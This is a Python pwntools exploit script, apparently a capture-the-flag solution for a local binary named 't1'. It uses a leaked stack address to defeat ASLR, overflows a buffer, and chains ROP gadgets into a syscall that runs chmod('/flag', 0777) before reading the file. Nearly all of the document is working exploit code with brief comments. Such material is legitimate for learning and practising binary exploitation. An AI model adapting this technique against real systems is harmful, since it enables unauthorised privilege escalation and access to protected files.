#!/usr/bin/env python3

from pwn import *
import os

# Use the leaked stack address to get a address for
# the filename string and bypass aslr.
# Use the available gadgets to mount a syscall to
# chmod('/flag', 0777)

def get_stack_leak(process):
    welcome_message = str(process.recv())
    initial_position = welcome_message.find('0x')
    final_position = welcome_message.find('.\n\n') - 5
    stack_leak = welcome_message[initial_position:final_position]
    return int(stack_leak, 16)
    
context.update(arch='amd64', os='linux') # set arch
binary_name = 't1'
p = process('./' + binary_name)

#gdb.attach(p, '''
#b *main
#b *main+463
#''')

#pattern = cyclic(200, n=8) #n = 8 for x64
overflow_until_ret = b'A' * (cyclic_find('laaaaaaa', n=8) - 8) # 88 to overflow until ret - 8 to overwrite RBP later
overflow_until_ret += b'BB' + b'/flag' + b'\x00' # 83 # Overwriting RBP, the end of the buffer with the name of my file + null terminator

stack_address = get_stack_leak(p) # get the leak of the stack address pointing to the start of the buffer
stack_flag = p64(stack_address + 0x52) # get end of the input buffer, the start of the string /flag

# get the necessary gadgets for ropping
binary_rop = ROP(binary_name)
syscall_address = p64(binary_rop.syscall.address)
pop_rax = p64(binary_rop.rax.address)
pop_rdi = p64(binary_rop.rdi.address)
pop_rsi = p64(binary_rop.rsi.address)

# chmod("/flag", 0777)
sys_chmod_code = p64(0x5A) # sys_chmod
chmod = p64(0x1FF) # 0777

exploit = b''
exploit += overflow_until_ret
# rax = syscall_code, rdi = address of file name, rsi = chmod octal value to set
exploit += pop_rax
exploit += sys_chmod_code
exploit += pop_rdi
exploit += stack_flag
exploit += pop_rsi
exploit += chmod
exploit += syscall_address

p.sendline(exploit)
os.system('cat /flag')
#p.interactive()
